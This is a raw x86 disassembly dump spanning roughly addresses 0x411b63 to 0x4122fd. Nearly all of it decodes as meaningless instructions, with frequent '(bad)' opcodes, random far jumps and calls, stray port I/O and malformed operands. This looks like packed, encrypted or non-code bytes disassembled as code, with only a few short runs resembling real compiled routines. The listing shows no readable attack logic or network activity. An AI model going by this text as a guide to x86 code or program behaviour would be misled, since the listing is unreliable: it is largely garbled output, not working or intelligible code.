  411b63:	push   esp
  411b64:	je     0x411b44
  411b66:	jbe    0x411b4b
  411b68:	xor    eax,0xb4fb88b4
  411b6d:	in     eax,0xd1
  411b6f:	ins    BYTE PTR es:[edi],dx
  411b70:	mov    cs,ebx
  411b72:	sbb    edx,edi
  411b74:	(bad)  
  411b75:	loopne 0x411b4c
  411b77:	fmul   QWORD PTR [esi+ecx*2]
  411b7a:	leave  
  411b7b:	push   esp
  411b7c:	adc    DWORD PTR [eax+0x58],eax
  411b7f:	mov    ch,0xa8
  411b81:	push   es
  411b82:	add    al,BYTE PTR [ebx+0x24ea8db2]
  411b88:	jle    0x411b0f
  411b8a:	jmp    0x411bdf
  411b8c:	addr16 pop edx
  411b8e:	repz imul ebp,ebx,0x9359df02
  411b95:	push   ds
  411b96:	xor    DWORD PTR [esi+0x53],0x71
  411b9a:	ror    bh,1
  411b9c:	out    dx,al
  411b9d:	sub    al,0x33
  411b9f:	pop    edi
  411ba0:	ins    BYTE PTR es:[edi],dx
  411ba1:	sub    esi,0x14a7396
  411ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba8:	ret    0x358c
  411bab:	xlat   BYTE PTR ds:[ebx]
  411bac:	repnz sti 
  411bae:	mov    WORD PTR [esi+0x4a],gs
  411bb1:	pop    ebx
  411bb2:	jmp    0x411c25
  411bb4:	xor    ch,bh
  411bb6:	and    al,0x7e
  411bb8:	jns    0x411b78
  411bba:	out    0x78,al
  411bbc:	inc    ecx
  411bbd:	mov    ah,0x4f
  411bbf:	jbe    0x411c0c
  411bc1:	add    al,0x2d
  411bc3:	mov    DWORD PTR ds:0x5f34c66f,esp
  411bc9:	mov    ebx,0xa0268b8d
  411bce:	outs   dx,DWORD PTR ds:[esi]
  411bcf:	aad    0xcd
  411bd1:	loope  0x411b99
  411bd3:	(bad)  
  411bd4:	sahf   
  411bd5:	ds or  al,0x47
  411bd8:	dec    edi
  411bd9:	je     0x411b86
  411bdb:	pop    ds
  411bdc:	add    BYTE PTR [ebx+ebp*8],0x57
  411be0:	sub    DWORD PTR [ebp-0x2c],ecx
  411be3:	jmp    0x411b75
  411be5:	inc    ebp
  411be6:	cwde   
  411be7:	push   ss
  411be8:	pushf  
  411be9:	adc    al,0xef
  411beb:	xchg   ecx,eax
  411bec:	add    al,0xa7
  411bee:	jp     0x411bd4
  411bf0:	jge    0x411c69
  411bf2:	lods   al,BYTE PTR ds:[esi]
  411bf3:	xchg   ebp,eax
  411bf4:	cdq    
  411bf5:	sbb    esp,DWORD PTR [ebx-0x79b6f575]
  411bfb:	cs cmc 
  411bfd:	or     al,0xbf
  411bff:	jne    0x411ba5
  411c01:	cld    
  411c02:	imul   ebx,DWORD PTR [ebx+0x68],0xe415452e
  411c09:	call   0xbe7b:0x7f1a3464
  411c10:	mov    edx,0xe56f6e36
  411c15:	and    bl,BYTE PTR [eax]
  411c17:	push   ss
  411c18:	cmp    DWORD PTR ds:0x393025cd,ebp
  411c1e:	sbb    al,BYTE PTR [esi]
  411c20:	iret   
  411c21:	sub    BYTE PTR [ebp+0x49],ch
  411c24:	dec    esp
  411c25:	jmp    0x411bfc
  411c27:	push   esi
  411c28:	icebp  
  411c29:	xor    esi,ebp
  411c2b:	pop    es
  411c2c:	push   cs
  411c2d:	int3   
  411c2e:	push   0xffffffe5
  411c30:	add    DWORD PTR [edx],ebx
  411c32:	pusha  
  411c33:	cld    
  411c34:	dec    ecx
  411c35:	dec    esi
  411c36:	(bad)  
  411c37:	adc    eax,0xbc8a8356
  411c3c:	xor    BYTE PTR [eax],cl
  411c3e:	int    0x98
  411c40:	sub    ecx,DWORD PTR [edi+0x62]
  411c43:	test   eax,0x94b690be
  411c48:	mov    bh,0xdb
  411c4a:	bound  ebp,QWORD PTR [edx-0x38edfcde]
  411c50:	mov    dl,0xa2
  411c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c53:	cld    
  411c54:	xor    DWORD PTR [edx-0x4c80881f],ebx
  411c5a:	xor    edi,esp
  411c5c:	outs   dx,BYTE PTR ds:[esi]
  411c5d:	inc    ebp
  411c5e:	cmp    al,0x86
  411c60:	(bad)  
  411c61:	es repz ja 0x411cab
  411c65:	push   ebx
  411c66:	sbb    bl,BYTE PTR [edx+0x24]
  411c69:	inc    esp
  411c6a:	sub    DWORD PTR [edi-0x72],ebx
  411c6d:	pop    es
  411c6e:	cmp    eax,0xde695f28
  411c73:	add    eax,0xddd15fe8
  411c78:	push   edi
  411c79:	push   es
  411c7a:	pop    ecx
  411c7b:	sbb    al,0xf5
  411c7d:	dec    edi
  411c7e:	sub    BYTE PTR [esi+eiz*1],0x3d
  411c82:	xchg   esp,eax
  411c83:	pop    ss
  411c84:	mov    edx,0xf9364e5e
  411c89:	jmp    0xe552:0x6c8cdc07
  411c90:	mov    ebx,0x72f2c37a
  411c95:	jae    0x411c91
  411c97:	gs out 0x1f,eax
  411c9a:	fs jnp 0x411cba
  411c9d:	cmp    ah,BYTE PTR [ebp-0x3b]
  411ca0:	cmp    BYTE PTR [eax-0x32],ch
  411ca3:	mov    edi,0x8b3a916e
  411ca8:	sbb    BYTE PTR [edx],al
  411caa:	lea    edx,[eax]
  411cac:	loope  0x411c95
  411cae:	into   
  411caf:	cmp    eax,0x8c716663
  411cb4:	sbb    ecx,DWORD PTR [esi+0x10]
  411cb7:	xchg   edx,eax
  411cb8:	pop    eax
  411cb9:	pop    eax
  411cba:	cmc    
  411cbb:	fimul  DWORD PTR [esi+0x35a44278]
  411cc1:	addr16 mov edx,0x97fe9bc
  411cc7:	repz xlat BYTE PTR ds:[ebx]
  411cc9:	enter  0xa17e,0xd8
  411ccd:	shr    BYTE PTR [ebx+ebx*1+0x24],cl
  411cd1:	inc    edi
  411cd2:	fnstcw WORD PTR [edx+0x60]
  411cd5:	jmp    0x7dcc9ad6
  411cda:	clc    
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0xd766579e
  411cfd:	mul    BYTE PTR [edi-0x27]
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	and    al,0x43
  411d0a:	psrad  mm0,QWORD PTR [ecx-0x44]
  411d0e:	add    eax,0x8fd5053b
  411d13:	jg     0x411d00
  411d15:	push   ss
  411d16:	cmp    edx,DWORD PTR [ebx]
  411d18:	push   esp
  411d19:	add    bh,dh
  411d1b:	sub    al,0x43
  411d1d:	fisub  WORD PTR cs:[edi]
  411d20:	add    BYTE PTR [edx+0x18b39447],ah
  411d26:	sbb    dh,BYTE PTR [edx+0x6a]
  411d29:	and    DWORD PTR [edx+0x41c71bf1],esp
  411d2f:	mov    WORD PTR [esi+ebx*1-0x3e],cs
  411d33:	test   BYTE PTR [esi],dh
  411d35:	imul   edi,DWORD PTR [ecx+0x33],0xffffff82
  411d39:	daa    
  411d3a:	cmc    
  411d3b:	mov    cl,0x7e
  411d3d:	mov    al,0xeb
  411d3f:	(bad)  
  411d40:	enter  0x2bba,0xfa
  411d44:	xchg   ecx,eax
  411d45:	push   0x3dc91c02
  411d4a:	inc    eax
  411d4b:	or     edi,ebx
  411d4d:	test   bh,dl
  411d4f:	push   ebx
  411d50:	ins    DWORD PTR es:[edi],dx
  411d51:	mov    eax,ds:0xca0dd543
  411d56:	cmp    cl,BYTE PTR [eax]
  411d58:	and    DWORD PTR [esi+0x1109278b],esi
  411d5e:	(bad)  
  411d5f:	int3   
  411d60:	outs   dx,DWORD PTR ds:[esi]
  411d61:	and    eax,0x796eb1f6
  411d66:	loop   0x411cf9
  411d68:	not    BYTE PTR [eax-0x64]
  411d6b:	lock lea eax,[esi+0x57fcfb06]
  411d72:	mov    eax,0xf0f2f09b
  411d77:	fbld   TBYTE PTR [ebx-0x56]
  411d7a:	gs enter 0xb789,0x1e
  411d7f:	or     edx,ecx
  411d81:	inc    ecx
  411d82:	fnstenv [edx]
  411d84:	into   
  411d85:	nop
  411d86:	mov    eax,ds:0xab95104a
  411d8b:	xlat   BYTE PTR ds:[ebx]
  411d8c:	mov    WORD PTR [ecx-0x3549365b],cs
  411d92:	add    BYTE PTR [ebx+0x47],bl
  411d95:	mov    BYTE PTR [eax+0x14aa59a1],ch
  411d9b:	xchg   ebp,eax
  411d9c:	out    dx,al
  411d9d:	stos   BYTE PTR es:[edi],al
  411d9e:	jno    0x411d88
  411da0:	adc    DWORD PTR [edx+0x529b71cb],0xffffffc8
  411da7:	and    bl,bl
  411da9:	inc    ebx
  411daa:	ins    BYTE PTR es:[edi],dx
  411dab:	lea    edi,[ebp-0x6b]
  411dae:	dec    ebp
  411daf:	cmp    al,0xd
  411db1:	pop    ebx
  411db2:	lods   eax,DWORD PTR ds:[esi]
  411db3:	dec    ebx
  411db4:	mov    ebx,0x90e318fd
  411db9:	out    dx,eax
  411dba:	enter  0x57ba,0xb1
  411dbe:	dec    edx
  411dbf:	loope  0x411d82
  411dc1:	mov    ds:0x571598f3,al
  411dc6:	sbb    al,0x99
  411dc8:	push   ss
  411dc9:	inc    ebx
  411dca:	sar    DWORD PTR [esi-0x28],0x25
  411dce:	and    eax,0xa6be3a5b
  411dd3:	fst    DWORD PTR [edi]
  411dd5:	mov    ah,0x31
  411dd7:	sar    ch,0x3f
  411dda:	mov    ?,WORD PTR [ebp+0x7c]
  411ddd:	es adc eax,0xcca2d4c3
  411de3:	sub    ebx,0x6feabd67
  411de9:	(bad)  
  411dea:	arpl   WORD PTR [edx+0x7cb07c79],bp
  411df0:	jmp    0xd738:0x611341ef
  411df7:	out    dx,al
  411df8:	out    dx,al
  411df9:	test   esi,ecx
  411dfb:	in     al,0xeb
  411dfd:	or     al,0x1a
  411dff:	in     al,dx
  411e00:	and    eax,0xb90c8bf3
  411e05:	push   edx
  411e06:	popf   
  411e07:	sti    
  411e08:	cmp    al,0x2c
  411e0a:	push   edx
  411e0b:	push   0x1b
  411e0d:	mov    eax,0xa2c59dd9
  411e12:	out    0x7b,eax
  411e14:	ins    DWORD PTR es:[edi],dx
  411e15:	sahf   
  411e16:	ror    BYTE PTR [esi+0x25b106cd],cl
  411e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e1d:	popf   
  411e1e:	lahf   
  411e1f:	sti    
  411e20:	loop   0x411de3
  411e22:	cmp    dh,BYTE PTR [eax+0x4b21ad7e]
  411e28:	sub    ah,ch
  411e2a:	ret    0x264f
  411e2d:	shl    BYTE PTR [esi+eiz*4-0x3],cl
  411e31:	push   edi
  411e32:	mov    DWORD PTR [ecx+0x38],eax
  411e35:	(bad)  
  411e36:	fisttp WORD PTR [edx-0x13]
  411e39:	dec    ebx
  411e3a:	xchg   edx,eax
  411e3b:	loop   0x411e84
  411e3d:	stos   BYTE PTR es:[edi],al
  411e3e:	jnp    0x411e37
  411e40:	or     BYTE PTR [ebx-0x3d1e5fee],dl
  411e46:	sub    DWORD PTR [ebx-0x75f51bed],esp
  411e4c:	mov    esp,0x5742d0e5
  411e51:	push   0x1e3b4d8c
  411e56:	xchg   edx,eax
  411e57:	dec    ebp
  411e58:	hlt    
  411e59:	loope  0x411e52
  411e5b:	imul   eax,DWORD PTR [edx+0x50],0xffffff9b
  411e5f:	jmp    0x406c5d24
  411e64:	or     BYTE PTR gs:[ecx+ebx*2-0x24266dda],ch
  411e6c:	test   ecx,ecx
  411e6e:	sub    DWORD PTR [edi],ecx
  411e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e71:	pushf  
  411e72:	test   eax,0xde2cf46e
  411e77:	add    ah,BYTE PTR [edx-0x501cd7ed]
  411e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7e:	stos   DWORD PTR es:[edi],eax
  411e7f:	jecxz  0x411e60
  411e81:	rcr    DWORD PTR [ebp-0x4da652b5],0x11
  411e88:	xor    al,0x9
  411e8a:	mov    DWORD PTR [ebx-0x696f8d95],edi
  411e90:	(bad)  
  411e91:	inc    edx
  411e92:	js     0x411eed
  411e94:	out    0x6,al
  411e96:	fnstcw WORD PTR [edx+0x7ee5a30f]
  411e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9d:	dec    edx
  411e9e:	adc    eax,0x5c3863e1
  411ea3:	pop    edx
  411ea4:	mov    cl,0x44
  411ea6:	pop    esp
  411ea7:	ret    0xe931
  411eaa:	sub    edx,DWORD PTR [eax-0x56]
  411ead:	inc    edi
  411eae:	mov    bl,0xd8
  411eb0:	ds ds cli 
  411eb3:	cmp    al,0x91
  411eb5:	aad    0xc8
  411eb7:	push   edi
  411eb8:	bound  esp,QWORD PTR [ebp+0x32]
  411ebb:	or     al,0x97
  411ebd:	xchg   ecx,eax
  411ebe:	cmp    bh,BYTE PTR [edi]
  411ec0:	call   0xbf8654e9
  411ec5:	add    esi,DWORD PTR [ebx-0x1e390be1]
  411ecb:	adc    cl,BYTE PTR [ebp-0x6c]
  411ece:	xor    BYTE PTR [edx+0x3a8227ba],0x9b
  411ed5:	xor    eax,0xa5e7aeb4
  411eda:	lahf   
  411edb:	push   ss
  411edc:	sub    dh,BYTE PTR [ebx-0x4dde2f5]
  411ee2:	pop    es
  411ee3:	jb     0x411efa
  411ee5:	ret    0x658f
  411ee8:	sub    eax,0x3811df7b
  411eed:	jl     0x411f5a
  411eef:	das    
  411ef0:	adc    DWORD PTR [edi],ebx
  411ef2:	(bad)  
  411ef3:	pop    esi
  411ef4:	mov    BYTE PTR [ebp+0xa],cl
  411ef7:	dec    eax
  411ef8:	iret   
  411ef9:	into   
  411efa:	retf   0x3c20
  411efd:	in     eax,0xe4
  411eff:	fs and al,0xa8
  411f02:	push   ds
  411f03:	idiv   DWORD PTR [edi+ecx*4-0x4d495d5]
  411f0a:	or     BYTE PTR [ecx-0x1a],bh
  411f0d:	push   cs
  411f0e:	loop   0x411f1b
  411f10:	cs cmc 
  411f12:	cmp    al,0x3d
  411f14:	addr16 mov ecx,0x681b8958
  411f1a:	call   0x7a1f:0x757cd990
  411f21:	aas    
  411f22:	jne    0x411ed8
  411f24:	pop    ds
  411f25:	adc    esi,DWORD PTR [edi-0x3c2898eb]
  411f2b:	enter  0x8e36,0x2e
  411f2f:	icebp  
  411f30:	lahf   
  411f31:	pushf  
  411f32:	jecxz  0x411f54
  411f34:	sbb    eax,0x68d9d986
  411f39:	xor    ah,cl
  411f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f3c:	cmp    DWORD PTR [ecx],ebx
  411f3e:	mov    eax,0x51bbb9ea
  411f43:	js     0x411f58
  411f45:	js     0x411ecf
  411f47:	fbld   TBYTE PTR [edi-0x319eea26]
  411f4d:	xchg   BYTE PTR [ecx-0x40],dl
  411f50:	jno    0x411f58
  411f52:	or     eax,0x62f3feaa
  411f57:	jge    0x411f39
  411f59:	mov    esp,0x67d35e7a
  411f5e:	ret    0xcc4b
  411f61:	shl    BYTE PTR [ecx],0x6d
  411f64:	popf   
  411f65:	test   eax,0x354adf0c
  411f6a:	and    BYTE PTR [ebx],ch
  411f6c:	sub    ah,dh
  411f6e:	popa   
  411f6f:	hlt    
  411f70:	xor    al,0xcd
  411f72:	loope  0x411eff
  411f74:	push   ebp
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	or     DWORD PTR [ebx+0x4c],edx
  411f91:	(bad)  
  411f92:	jmp    0x411fff
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	xor    BYTE PTR [edx+0x7c],dh
  411f9d:	lock push ebx
  411f9f:	push   ecx
  411fa0:	daa    
  411fa1:	push   es
  411fa2:	jnp    0x41201f
  411fa4:	or     al,0xf1
  411fa6:	test   al,0xff
  411fa8:	aas    
  411fa9:	stos   DWORD PTR es:[edi],eax
  411faa:	adc    BYTE PTR [edi+eax*1-0x19],ah
  411fae:	popa   
  411faf:	push   es
  411fb0:	outs   dx,BYTE PTR ds:[esi]
  411fb1:	dec    edx
  411fb2:	mov    esi,0xd44ab578
  411fb7:	sbb    BYTE PTR [esi+eiz*4+0x36],0xbe
  411fbc:	cmp    edx,DWORD PTR [esi]
  411fbe:	and    DWORD PTR [edx],ebp
  411fc0:	xor    ebp,0xffffffe0
  411fc3:	dec    ebx
  411fc4:	push   ebp
  411fc5:	xor    al,0x1c
  411fc7:	pop    edx
  411fc8:	js     0x41201d
  411fca:	add    bh,BYTE PTR [eax-0x35]
  411fcd:	sbb    bl,BYTE PTR [ebx]
  411fcf:	dec    edx
  411fd0:	cmp    BYTE PTR [ecx],ch
  411fd2:	push   esp
  411fd3:	mov    DWORD PTR [ebx+0x30],edx
  411fd6:	ror    DWORD PTR [ecx],cl
  411fd8:	jb     0x411ff2
  411fda:	mov    eax,ds:0x48e4de6b
  411fdf:	sub    eax,0x8f55ea5c
  411fe4:	cwde   
  411fe5:	out    0x9d,eax
  411fe7:	cli    
  411fe8:	cmp    cl,BYTE PTR [ebx]
  411fea:	lahf   
  411feb:	rol    BYTE PTR [edi+0xc],cl
  411fee:	jno    0x411fc0
  411ff0:	cmp    bh,dh
  411ff2:	in     eax,0x59
  411ff4:	pop    edi
  411ff5:	test   bh,0x5e
  411ff8:	arpl   WORD PTR es:[esi+0x45],si
  411ffc:	outs   dx,BYTE PTR ds:[esi]
  411ffd:	xor    bh,BYTE PTR [ecx+0xc]
  412000:	popa   
  412001:	outs   dx,BYTE PTR ds:[esi]
  412002:	popf   
  412003:	fdiv   QWORD PTR [ebx+edx*8+0x561e9]
  41200a:	inc    esi
  41200b:	rcr    BYTE PTR [esi+esi*4],0xc
  41200f:	imul   ebx,ecx,0xffffffde
  412012:	ins    BYTE PTR es:[edi],dx
  412013:	jbe    0x412015
  412015:	es pop edx
  412017:	adc    BYTE PTR [ecx],ah
  412019:	ins    BYTE PTR es:[edi],dx
  41201a:	sar    BYTE PTR [ecx-0x5],cl
  41201d:	xchg   edx,eax
  41201e:	sbb    cl,BYTE PTR [edx+0x7d]
  412021:	jmp    0xb9d0ce77
  412026:	fnstenv [edi+0x40]
  412029:	out    0xda,eax
  41202b:	mov    eax,ds:0x908cd095
  412030:	aaa    
  412031:	(bad)  
  412032:	push   DWORD PTR [eax]
  412034:	call   0xd183:0xf0fb519d
  41203b:	mov    ds,WORD PTR [esi+eax*2-0x6dbb12d1]
  412042:	cs dec ecx
  412044:	addr16 xchg ecx,eax
  412046:	xor    al,0xd8
  412048:	jl     0x412044
  41204a:	ret    
  41204b:	push   ds
  41204c:	in     eax,0x53
  41204e:	inc    esp
  41204f:	cwde   
  412050:	add    DWORD PTR [ebp+0x16],esp
  412053:	sahf   
  412054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412055:	and    DWORD PTR [esi+0x68],0xffffffd2
  412059:	std    
  41205a:	mov    ah,al
  41205c:	and    DWORD PTR [edi],esi
  41205e:	icebp  
  41205f:	mov    eax,0x94e07f1b
  412064:	popf   
  412065:	sbb    DWORD PTR [ebp-0xc],esi
  412068:	mov    cl,0x81
  41206a:	add    bl,BYTE PTR ds:0x9b7f5df9
  412070:	mov    ds:0x965f0ec8,eax
  412075:	adc    dl,BYTE PTR [esi-0x4b7f65a0]
  41207b:	push   edx
  41207c:	cld    
  41207d:	(bad)  
  41207e:	dec    edi
  41207f:	inc    edx
  412080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412081:	pop    edx
  412082:	push   esi
  412083:	int    0x9
  412085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412086:	clc    
  412087:	cmp    DWORD PTR [ecx+0x1e3d8933],ebp
  41208d:	fild   DWORD PTR [ebx+ebx*1]
  412090:	pop    es
  412091:	lods   al,BYTE PTR ds:[esi]
  412092:	rcl    cl,cl
  412094:	sub    bh,BYTE PTR [eax]
  412096:	mov    cs,WORD PTR [eax-0x17]
  412099:	inc    ecx
  41209a:	jnp    0x412021
  41209c:	xor    ah,BYTE PTR [eax+0x71cbcb97]
  4120a2:	or     dh,BYTE PTR [edx]
  4120a4:	test   DWORD PTR [eax-0x61],ebp
  4120a7:	mov    bh,0x59
  4120a9:	xchg   ebx,eax
  4120aa:	aas    
  4120ab:	pop    edx
  4120ac:	adc    BYTE PTR [esi],bl
  4120ae:	dec    ebp
  4120af:	add    ch,BYTE PTR [ebx-0x70]
  4120b2:	add    BYTE PTR ds:0xea439465,bh
  4120b8:	(bad)  
  4120b9:	popa   
  4120ba:	(bad)  
  4120bb:	(bad)  
  4120bc:	rcl    BYTE PTR [edx+0x748bd5ae],0xa8
  4120c3:	fcmovu st,st(0)
  4120c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c6:	inc    edx
  4120c7:	in     al,dx
  4120c8:	int3   
  4120c9:	or     BYTE PTR ds:0xb1a4b17a,dh
  4120cf:	cmp    ecx,DWORD PTR [ecx+0x1f]
  4120d2:	bound  edi,QWORD PTR [esi-0x414c64ae]
  4120d8:	imul   ebx,DWORD PTR [ebp+0x737c3782],0x18
  4120df:	clc    
  4120e0:	mov    dl,0xf0
  4120e2:	dec    esp
  4120e3:	ins    DWORD PTR es:[edi],dx
  4120e4:	lds    eax,FWORD PTR [edx+0x53e91a8]
  4120ea:	call   0x4dda:0x2ec30329
  4120f1:	pop    esi
  4120f2:	inc    edi
  4120f3:	and    eax,0xba806c
  4120f8:	iret   
  4120f9:	jmp    0x8efa:0xa7132474
  412100:	jno    0x412121
  412102:	jle    0x41214d
  412104:	or     al,0x7f
  412106:	mov    WORD PTR [edi],?
  412108:	add    edx,DWORD PTR [ecx]
  41210a:	out    dx,al
  41210b:	cmp    WORD PTR [eax-0x35ea188e],bx
  412112:	pop    edx
  412113:	sub    BYTE PTR [esi+edx*8],dl
  412116:	cld    
  412117:	ja     0x4120ff
  412119:	jno    0x41217d
  41211b:	int3   
  41211c:	add    BYTE PTR [edx+0x36],ah
  41211f:	xchg   ecx,eax
  412120:	push   ds
  412121:	xor    eax,0x14a75217
  412126:	inc    edx
  412127:	(bad)  
  412128:	pop    ebp
  412129:	mov    edx,0xc730bdaf
  41212e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41212f:	(bad)  
  412130:	cmp    eax,0x24da2faa
  412135:	mov    ebp,0x7ee3d2f8
  41213a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41213c:	jmp    0x8e46:0x4fdc3cc9
  412143:	fsub   DWORD PTR [ebx-0x56]
  412146:	jmp    0x41217a
  412148:	fwait
  412149:	pop    edi
  41214a:	xor    ebp,DWORD PTR [ebx+edx*2-0x47]
  41214e:	push   eax
  41214f:	int    0xa5
  412151:	jecxz  0x412188
  412153:	out    dx,al
  412154:	pop    ebp
  412155:	push   edi
  412156:	xlat   BYTE PTR ds:[ebx]
  412157:	push   ss
  412158:	jb     0x412131
  41215a:	popa   
  41215b:	fdivr  DWORD PTR [esi+0x52]
  41215e:	pushf  
  41215f:	pop    eax
  412160:	or     al,0x32
  412162:	cdq    
  412163:	loope  0x412163
  412165:	popa   
  412166:	or     ch,BYTE PTR [eax-0x468bf0a6]
  41216c:	sub    DWORD PTR [ebx],ebx
  41216e:	inc    ebp
  41216f:	retf   
  412170:	mov    ds:0x777e3a08,eax
  412175:	test   DWORD PTR [edi+0x66],eax
  412178:	cs pop eax
  41217a:	repnz or bh,BYTE PTR [ebx-0x104416d2]
  412181:	(bad)  
  412182:	fcmovnu st,st(3)
  412184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412185:	shr    BYTE PTR [esi+0x7daf36cf],1
  41218b:	adc    eax,0x29d3cd31
  412190:	dec    eax
  412191:	nop
  412192:	xor    BYTE PTR [ecx-0x48eabeb7],dl
  412198:	lock lahf 
  41219a:	dec    ebx
  41219b:	inc    edi
  41219c:	or     BYTE PTR [ecx+ecx*4+0x5],ah
  4121a0:	push   esi
  4121a1:	pop    bp
  4121a3:	inc    ebp
  4121a4:	or     al,0x1e
  4121a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121a7:	dec    esi
  4121a8:	fstp   TBYTE PTR ds:0x99ed492d
  4121ae:	mov    edi,ds
  4121b0:	push   eax
  4121b1:	sti    
  4121b2:	mov    bl,0xbc
  4121b4:	jne    0x412153
  4121b6:	ja     0x412167
  4121b8:	pop    ebx
  4121b9:	push   esp
  4121ba:	das    
  4121bb:	popf   
  4121bc:	mov    DWORD PTR [esi-0x6aa497b0],ebx
  4121c2:	(bad)
  4121c5:	xchg   edx,eax
  4121c6:	mov    eax,ds:0x251d2226
  4121cb:	xchg   ecx,eax
  4121cc:	cmp    esp,ebp
  4121ce:	lock dec ebx
  4121d0:	sbb    ch,bh
  4121d2:	mov    es:0x547a15bd,eax
  4121d8:	push   ss
  4121d9:	ds out dx,al
  4121db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121dc:	jmp    0xd005:0xcdf540b9
  4121e3:	inc    ebp
  4121e4:	out    dx,al
  4121e5:	lahf   
  4121e6:	sbb    cl,ch
  4121e8:	xchg   DWORD PTR [edi],ecx
  4121ea:	cmc    
  4121eb:	mov    ch,BYTE PTR [edx-0x41]
  4121ee:	push   0xf34b08bb
  4121f3:	inc    edx
  4121f4:	mov    cl,0x50
  4121f6:	out    0x80,eax
  4121f8:	xchg   edi,eax
  4121f9:	mov    DWORD PTR [ecx-0x2ee689d8],esp
  4121ff:	jae    0x412276
  412201:	pop    esi
  412202:	mov    ebp,0xf90338c0
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	add    ebp,esi
  412235:	dec    ebx
  412236:	jmp    0x7ee5:0x78786950
  41223d:	js     0x4122b7
  41223f:	out    dx,eax
  412240:	xchg   edx,eax
  412241:	mov    bh,0xd9
  412243:	dec    eax
  412244:	xchg   BYTE PTR [eax-0x3cecbd6f],bl
  41224a:	jg     0x412251
  41224c:	jo     0x412279
  41224e:	imul   eax,esp,0x6
  412251:	inc    edx
  412252:	mov    esi,0x35208476
  412257:	xor    DWORD PTR [ebx],esi
  412259:	jp     0x412221
  41225b:	dec    eax
  41225c:	jmp    0x8245:0x49e31abc
  412263:	cmp    ah,BYTE PTR [ecx+0x38130310]
  412269:	jle    0x412274
  41226b:	xchg   DWORD PTR [esi-0x5a994945],esi
  412271:	mov    ?,eax
  412273:	ud2    
  412275:	xor    al,0x19
  412277:	call   0x1cd0:0x9956835
  41227e:	les    edx,FWORD PTR [ecx+0x5d]
  412281:	fst    DWORD PTR [edi-0x7a]
  412284:	sbb    eax,0x7380aa5f
  412289:	fxsave [edx]
  41228c:	mov    edx,DWORD PTR [edx]
  41228e:	pop    ebx
  41228f:	mov    ebp,ebx
  412291:	pop    eax
  412292:	jg     0x412292
  412294:	mov    edi,DWORD PTR [eax+esi*8+0x7ca872ab]
  41229b:	(bad)  
  41229c:	dec    eax
  41229d:	xor    al,0xa
  41229f:	jp     0x4122ce
  4122a1:	push   DWORD PTR [eax+0x1]
  4122a4:	out    dx,eax
  4122a5:	sbb    cl,dh
  4122a7:	scas   eax,DWORD PTR es:[edi]
  4122a8:	loope  0x4122f7
  4122aa:	ds inc ebp
  4122ac:	push   edi
  4122ad:	xor    edx,DWORD PTR [edx+ebp*8]
  4122b0:	dec    eax
  4122b1:	hlt    
  4122b2:	or     al,dl
  4122b4:	dec    esi
  4122b5:	or     BYTE PTR [ebx-0x17110ddd],ch
  4122bb:	std    
  4122bc:	dec    edx
  4122bd:	xchg   esi,eax
  4122be:	cmp    cl,BYTE PTR [ecx]
  4122c0:	call   0x19427891
  4122c5:	add    eax,DWORD PTR [esi-0x5e]
  4122c8:	sbb    DWORD PTR [ebp+ebx*4+0x26],edx
  4122cc:	pop    ebp
  4122cd:	push   ds
  4122ce:	retf   0x8a9f
  4122d1:	mov    eax,ds:0x5501a5c0
  4122d6:	repnz sub al,0x38
  4122d9:	inc    edx
  4122da:	push   eax
  4122db:	dec    ebx
  4122dc:	mov    cl,0x5f
  4122de:	nop
  4122df:	lds    esp,FWORD PTR [edi]
  4122e1:	pop    es
  4122e2:	scas   eax,DWORD PTR es:[edi]
  4122e3:	mov    eax,ds:0xd049dc6f
  4122e8:	and    eax,0x566d768e
  4122ed:	xchg   esp,eax
  4122ee:	xacquire xchg DWORD PTR [esi+0x20],ebp
  4122f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f3:	pop    eax
  4122f4:	js     0x412313
  4122f6:	push   ebp
  4122f7:	cmp    edx,DWORD PTR [esi+0x7aaf1a40]
  4122fd:	mov    dl,0xe9
